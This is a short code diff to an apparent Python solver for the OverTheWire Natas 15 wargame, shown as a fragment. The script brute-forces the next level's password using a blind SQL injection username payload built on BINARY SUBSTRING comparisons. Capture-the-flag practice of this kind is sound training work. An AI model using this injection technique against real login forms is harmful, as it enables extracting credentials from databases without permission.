@@ -3,14 +3,14 @@ import string
 
 url = "http://natas15.natas.labs.overthewire.org/"
 charset = string.ascii_letters + string.digits
-password_length = 32
+this_password = '[NATAS15 PASSWORD]'
 
 session = requests.Session()
-session.auth = ('natas15', '[PASSWORD]')
+session.auth = ('natas15', this_password)
 
 password = ""
 
-for i in range(1, password_length + 1):
+for i in range(1, 33):
     for guess in charset:
         payload = {
             "username": f'natas16" AND BINARY SUBSTRING(password, {i}, 1) = "{guess}'
